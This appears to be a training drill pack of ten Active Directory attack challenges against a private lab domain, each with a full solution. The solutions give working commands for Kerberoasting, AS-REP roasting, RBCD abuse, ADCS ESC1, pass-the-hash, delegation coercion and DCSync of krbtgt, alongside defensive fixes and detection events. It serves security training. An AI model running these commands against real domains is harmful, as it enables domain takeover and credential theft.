# Drill Pack 05 — Active Directory

> Deep, Practical-style AD pack: **10 challenges** from a single low-priv foothold to full domain dominance. Each has a **full solution** — commands, expected output, the **exact answer**, the PAM control that breaks it, and a faster route. Solve under a timer; expand the solution only when done or stuck.
>
> **Prereq:** the AD lab from [`../../labs/ansible/`](../../labs/ansible/) running — DC/ADCS `dc01` `192.168.56.30` (`ceh.lab`), member `ws01` `192.168.56.31`. **Foothold:** `jdoe` / `Passw0rd!` (assumed-breach). **Lab only** — these are real domain-takeover techniques.
>
> Recipes: [`../challenge-playbooks.md`](../challenge-playbooks.md) · full chain: [`../../labs/capstone.md`](../../labs/capstone.md) · defender view: [identity-attack-paths](../../defender-pam/identity-attack-paths.md).

> **Before any Kerberos/Impacket command, sync your clock to the DC** (`sudo ntpdate 192.168.56.30`) and point DNS at it. Clock skew > 5 min → `KRB_AP_ERR_SKEW`; a raw IP where an FQDN is required → `KDC_ERR_S_PRINCIPAL_UNKNOWN`. Challenge 10 drills this.

---

### 1 — Map the domain ⏱️ 8 min
**Q:** Authenticated as `jdoe`, enumerate `ceh.lab` and identify the Kerberoastable service account. What is the exact **SPN** registered to it?
<details><summary>Solution</summary>

```bash
nxc smb 192.168.56.30 -u jdoe -p 'Passw0rd!' --users --groups
# List accounts that carry an SPN (the Kerberoastable ones):
impacket-GetUserSPNs ceh.lab/jdoe:'Passw0rd!' -dc-ip 192.168.56.30
# Collect the whole graph for BloodHound (used in challenge 2):
bloodhound-python -u jdoe -p 'Passw0rd!' -d ceh.lab -ns 192.168.56.30 -c all --zip
```
**You should see:** a user list including `svc-sql`, and a `ServicePrincipalName` column pairing it with a SQL SPN.
**Answer:** service account `svc-sql`, SPN `MSSQLSvc/dc01.ceh.lab:1433`.
🛡️ **Fix:** anyone authenticated can read most of AD by design — you can't block recon, so deny what it finds with least-privilege ACLs and flag mass-LDAP / SharpHound collection with Defender for Identity / UEBA.
⚡ **faster:** `nxc ldap 192.168.56.30 -u jdoe -p 'Passw0rd!' --bloodhound -c all --dns-server 192.168.56.30` collects and enumerates in one shot.
</details>

### 2 — Shortest path to Domain Admin (BloodHound) ⏱️ 8 min
**Q:** Load the collection, mark `jdoe` as Owned, and run the shortest-path query to Domain Admins. What is the **first edge** on the path and its **target object**?
<details><summary>Solution</summary>

```bash
sudo neo4j start                 # graph DB
bloodhound                       # GUI — drag the .zip onto the window
# Right-click jdoe → Mark as Owned. Query:
#   "Shortest Paths to Domain Admins from Owned Principals"
```
**You should see:** an edge from `JDOE@CEH.LAB` straight onto the computer `WS01`, plus a second route through the vulnerable cert template (`ADCSESC1` edge → the CA → Domain Admins).
**Answer:** first edge `GenericWrite` → target `WS01` (the write that enables the RBCD takeover in challenge 5). The ADCS ESC1 route (challenge 6) is the alternative shortest path.
🛡️ **Fix:** the whole path exists because a low-priv user holds a write on a computer object — audit and remove `GenericWrite`/`GenericAll` from tier-2 users, and tier admin so a foothold can't reach Tier 0.
⚡ **faster:** in BloodHound CE run the built-in *Dangerous Privileges* / *Owned → high value* pathfinding instead of hand-tracing edges.
</details>

### 3 — Kerberoast svc-sql ⏱️ 10 min
**Q:** Recover the **plaintext password** of `svc-sql`.
<details><summary>Solution</summary>

```bash
impacket-GetUserSPNs ceh.lab/jdoe:'Passw0rd!' -dc-ip 192.168.56.30 -request -outputfile kerb.txt
# You should see: a $krb5tgs$23$*svc-sql*... blob written to kerb.txt
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 13100 kerb.txt --show
```
**You should see:** hashcat reports `Cracked`, and `--show` prints the blob followed by `:Summer2024!`.
**Answer:** `Summer2024!`
🛡️ **Fix:** convert SPN accounts to a **gMSA** (AD auto-rotates a 120+ char password) or CPM-rotated long random secret, AES-only — re-roasting a gMSA gives a ticket you cannot dictionary-crack. Detection: `4769` TGS requests using RC4 (`0x17`).
⚡ **faster:** `nxc ldap 192.168.56.30 -u jdoe -p 'Passw0rd!' --kerberoasting kerb.txt` requests every SPN ticket without Impacket.
</details>

### 4 — AS-REP roast ⏱️ 8 min
**Q:** One account has *"Kerberos pre-authentication not required"* set. **Which account**, and what is its **password**?
<details><summary>Solution</summary>

```bash
# No password needed — pre-auth is off (-no-pass). Feed it the enumerated user list:
impacket-GetNPUsers ceh.lab/ -usersfile users.txt -no-pass -dc-ip 192.168.56.30 \
  -format hashcat -outputfile asrep.txt
# You should see: a $krb5asrep$23$helpdesk@CEH.LAB:... blob
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 18200 asrep.txt --show
```
**You should see:** hashcat cracks the `-m 18200` blob to `:Welcome1`.
**Answer:** account `helpdesk`, password `Welcome1`.
🛡️ **Fix:** require pre-authentication on **every** account (remove `DONT_REQUIRE_PREAUTH`) and vault/rotate any legacy account's password. Detection: `4768` with pre-auth type `0`.
⚡ **faster:** `nxc ldap 192.168.56.30 -u jdoe -p 'Passw0rd!' --asreproast asrep.txt` finds and dumps no-preauth accounts directly.
</details>

### 5 — RBCD: shell as Administrator on ws01 ⏱️ 14 min
**Q:** Abuse `jdoe`'s `GenericWrite` on `ws01` (Resource-Based Constrained Delegation) to get a shell as Administrator on that host. What is the **hostname** the shell reports?
<details><summary>Solution</summary>

```bash
sudo ntpdate 192.168.56.30      # Kerberos next — sync the clock first
# 1. Add a computer account we control (normal users may add up to 10):
impacket-addcomputer ceh.lab/jdoe:'Passw0rd!' -computer-name 'ATTACK$' \
  -computer-pass 'AttackPass123!' -dc-ip 192.168.56.30
# 2. Use the GenericWrite to let ATTACK$ act on behalf of others toward ws01:
impacket-rbcd ceh.lab/jdoe:'Passw0rd!' -delegate-to 'ws01$' -delegate-from 'ATTACK$' \
  -action write -dc-ip 192.168.56.30
# You should see: "Delegation rights modified successfully!"
# 3. Mint a service ticket AS Administrator for ws01's file service:
impacket-getST ceh.lab/'ATTACK$':'AttackPass123!' -spn 'cifs/ws01.ceh.lab' \
  -impersonate Administrator -dc-ip 192.168.56.30
export KRB5CCNAME='Administrator@cifs_ws01.ceh.lab@CEH.LAB.ccache'
impacket-psexec -k -no-pass ceh.lab/Administrator@ws01.ceh.lab
hostname
```
**You should see:** a SYSTEM shell (`nt authority\system`); `hostname` prints the box name.
**Answer:** `WS01`
🛡️ **Fix:** low-priv users must not hold `GenericWrite`/`GenericAll` on computer objects — audit and remove them, and tier admin. Detection: `5136` modifying `msDS-AllowedToActOnBehalfOfOtherIdentity`.
⚡ **faster:** `impacket-getST -spn cifs/ws01.ceh.lab -impersonate Administrator` accepts the machine hash too — dump `ATTACK$`'s hash once and skip retyping the password.
</details>

### 6 — Abuse the vulnerable ADCS template ⏱️ 12 min
**Q:** AD Certificate Services has a misconfigured template. **What is its name**, and what NT hash do you obtain by abusing it?
<details><summary>Solution</summary>

```bash
certipy find -u jdoe@ceh.lab -p 'Passw0rd!' -dc-ip 192.168.56.30 -vulnerable -stdout
# You should see: a template flagged [!] ESC1 under CA 'ceh-DC01-CA'
certipy req -u jdoe@ceh.lab -p 'Passw0rd!' -dc-ip 192.168.56.30 \
  -ca 'ceh-DC01-CA' -template 'ESC1-Vuln' -upn administrator@ceh.lab
# You should see: administrator.pfx saved
certipy auth -pfx administrator.pfx -dc-ip 192.168.56.30
```
**You should see:** `[*] Got TGT` and `[*] Got hash for 'administrator@ceh.lab': aad3b...:7facdc498ed1680c4fd1448319a8c04f`.
**Answer:** template `ESC1-Vuln`; Administrator NT hash `7facdc498ed1680c4fd1448319a8c04f`.
🛡️ **Fix:** remove the "supply subject in request" (SAN) flag, require **manager approval**, and tighten template + CA ACLs — certs ignore password rotation, so this is a first-class PAM concern. Re-run `certipy find` (audit mode) to prove the fix.
⚡ **faster:** `certipy find -vulnerable -enabled -stdout` filters straight to enrollable, exploitable templates.
</details>

### 7 — Pass-the-Hash to ws01 ⏱️ 6 min
**Q:** Using the Administrator NT hash from challenge 6 (no plaintext), get a shell on `192.168.56.31`. Confirm the **hostname**.
<details><summary>Solution</summary>

```bash
# Validate the hash works before spending a shell on it:
nxc smb 192.168.56.31 -u administrator -H 7facdc498ed1680c4fd1448319a8c04f
# You should see: (Pwn3d!) next to the host
impacket-psexec -hashes :7facdc498ed1680c4fd1448319a8c04f ceh.lab/administrator@192.168.56.31
# or a WinRM shell:
evil-winrm -i 192.168.56.31 -u administrator -H 7facdc498ed1680c4fd1448319a8c04f
hostname
```
**You should see:** `(Pwn3d!)` from nxc, then a SYSTEM/Administrator shell — no password ever typed.
**Answer:** `WS01`
🛡️ **Fix:** **LAPS** (unique, rotated local-admin passwords) kills hash reuse; **Protected Users** + tiering + Credential Guard stop the hash being stolen or replayed.
⚡ **faster:** `nxc smb 192.168.56.31 -u administrator -H <hash> -x hostname` runs the command inline without opening a shell.
</details>

### 8 — Unconstrained delegation on ws01 ⏱️ 14 min
**Q:** `ws01` is trusted for **unconstrained delegation**. From your SYSTEM foothold on it, coerce the DC to authenticate and capture a TGT. **Whose ticket** do you capture?
<details><summary>Solution</summary>

```bash
# Pull ws01's own machine-account hash (you are SYSTEM on it from ch.5/7):
nxc smb 192.168.56.31 -u administrator -H 7facdc498ed1680c4fd1448319a8c04f --lsa
# Catch delegated TGTs with ws01$'s key (krbrelayx, dirkjanm):
python3 krbrelayx.py -hashes :<ws01_machine_NThash>
# In another shell, force the DC to authenticate to ws01 (printerbug / PetitPotam):
python3 printerbug.py ceh.lab/jdoe:'Passw0rd!'@192.168.56.30 192.168.56.31
```
**You should see:** krbrelayx writes `DC01$@CEH.LAB.ccache` — the Domain Controller's own TGT, which is DCSync-capable (feeds challenge 9).
**Answer:** the machine account **`DC01$`** (the Domain Controller's TGT).
🛡️ **Fix:** remove unconstrained delegation from member servers; mark admins and DCs *"sensitive — cannot be delegated"* and add them to **Protected Users**. Detection: `4768` TGTs delivered to a delegation host that shouldn't hold them.
⚡ **faster:** `PetitPotam.py -u jdoe -p 'Passw0rd!' -d ceh.lab 192.168.56.31 192.168.56.30` coerces without needing print-spooler enabled.
</details>

### 9 — DCSync the krbtgt hash ⏱️ 8 min
**Q:** With Administrator/DC-level rights, replicate the directory and pull the **krbtgt NT hash**.
<details><summary>Solution</summary>

```bash
# Pass-the-Hash straight into secretsdump (Administrator from ch.6):
impacket-secretsdump ceh.lab/administrator@192.168.56.30 \
  -hashes :7facdc498ed1680c4fd1448319a8c04f -just-dc-user krbtgt
# (or, with DC01$'s ccache from ch.8:  impacket-secretsdump -k -no-pass ceh.lab/'DC01$'@dc01.ceh.lab -just-dc-user krbtgt)
```
**You should see:** `krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1a59bd44fe5bec39c44c8efdb2b1f2d0:::` pulled via replication.
**Answer:** krbtgt NT hash `1a59bd44fe5bec39c44c8efdb2b1f2d0` (Golden-Ticket capable = total domain control).
🛡️ **Fix:** grant `DS-Replication-Get-Changes-All` **only** to DCs, isolate Tier 0, and after **any** DA compromise **rotate `krbtgt` twice** (spaced past ticket lifetime) so stolen keys die. Detection: `4662` replication requested from a **non-DC** host.
⚡ **faster:** drop `-just-dc-user krbtgt` to dump every hash (`-just-dc`) in one replication pass.
</details>

### 10 — Fix the Kerberos clock-skew failure ⏱️ 3 min
**Q:** `impacket-getST` dies with `KRB_AP_ERR_SKEW(Clock skew too great)`. Fix it so the ticket mints. What's the one-line cause and cure?
<details><summary>Solution</summary>

```bash
sudo systemctl stop systemd-timesyncd     # stop NTP from re-drifting you
sudo ntpdate 192.168.56.30                 # sync Kali's clock TO the DC
# alternatives:  sudo rdate -n 192.168.56.30   |   sudo faketime "$(date)" <cmd>
timedatectl                                # confirm the offset is now ~0
# now the Kerberos command succeeds
```
**You should see:** `ntpdate` steps the clock by a few minutes; the re-run of the Kerberos command now returns a `.ccache` instead of the SKEW error.
**Answer:** cause = Kali's clock differs from the DC by > 5 min; cure = `sudo ntpdate 192.168.56.30` (sync to the DC) before any Kerberos/Impacket command. Also use the **FQDN** (`ws01.ceh.lab`), never the raw IP, and `export KRB5CCNAME` after minting.
🛡️ **Fix:** not a vuln — but Kerberos-only auth with strict domain time sync (and NTLM disabled) is itself hardening; the skew window is what keeps replayed tickets short-lived.
⚡ **faster:** `sudo ntpdate 192.168.56.30 && export KRB5CCNAME=$(ls *.ccache)` chains sync + ticket load into one line.
</details>

---

## Score yourself
Score each: **✅ under target time / ⚠️ over time / ❌ needed the solution**. Re-drill anything not ✅ cold.

| # | Challenge | Target | Score |
|---|---|---|---|
| 1 | Map the domain (SPN) | 8 min | |
| 2 | Shortest path to DA (BloodHound) | 8 min | |
| 3 | Kerberoast svc-sql | 10 min | |
| 4 | AS-REP roast | 8 min | |
| 5 | RBCD → Administrator on ws01 | 14 min | |
| 6 | ADCS ESC1 template | 12 min | |
| 7 | Pass-the-Hash to ws01 | 6 min | |
| 8 | Unconstrained delegation | 14 min | |
| 9 | DCSync krbtgt | 8 min | |
| 10 | Clock-skew fix | 3 min | |

When 1–9 are ✅ cold and 10 is reflex, chain them end-to-end in [`../../labs/capstone.md`](../../labs/capstone.md) — then run it a **second** time with each PAM fix applied and watch every win become a logged, contained loss.

## Sources
- The Hacker Recipes — Active Directory: https://www.thehacker.recipes/ad/
- Impacket (Fortra): https://github.com/fortra/impacket
- Certipy (ADCS ESC1–8): https://github.com/ly4k/Certipy
- krbrelayx / printerbug / PetitPotam (delegation & coercion): https://github.com/dirkjanm/krbrelayx
- SpecterOps — Certified Pre-Owned (ADCS): https://posts.specterops.io/certified-pre-owned-d95910965cd2
- BloodHound docs: https://bloodhound.readthedocs.io/
